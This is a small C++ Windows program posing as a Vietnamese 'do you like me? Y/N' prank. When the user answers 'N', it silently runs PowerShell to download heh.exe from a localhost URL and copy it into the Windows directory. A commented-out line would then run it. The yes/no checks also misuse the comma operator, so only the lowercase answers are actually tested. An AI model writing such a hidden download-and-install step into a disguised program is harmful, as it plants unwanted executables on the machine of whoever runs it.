#include <iostream>
#include <string>
#include <windows.h>

using namespace std;

int main() {
    string traloi;
    system("color f9");
    cout << "Cau co thich to khum<3? Y/N" << endl;
    cin >> traloi;
    if (traloi == "Y", traloi == "y") {
        system("cls");
        cout << "To biet ma<3" << endl;
        system("pause");
        return 0;
    } 
    if (traloi == "N",traloi == "n") {
        system("cls");
        cout << "=(" << endl;
        system("echo =(");
        system("powershell curl http://localhost/download/heh.exe");
        system("powershell copy heh.exe %windows%");
        // system("powershell heh.exe");   
    }


    return 0;
}